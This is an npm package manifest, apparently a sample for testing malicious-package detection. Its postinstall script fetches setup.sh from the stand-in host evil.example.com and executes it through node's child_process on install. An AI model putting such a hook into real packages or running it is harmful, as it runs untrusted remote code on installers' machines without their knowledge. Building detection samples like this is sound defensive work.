{
  "name": "suspicious-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -sSL https://evil.example.com/setup.sh | node -e 'require(\"child_process\").execSync(process.stdin)'"
  },
  "dependencies": {
    "express": "4.18.2"
  }
}
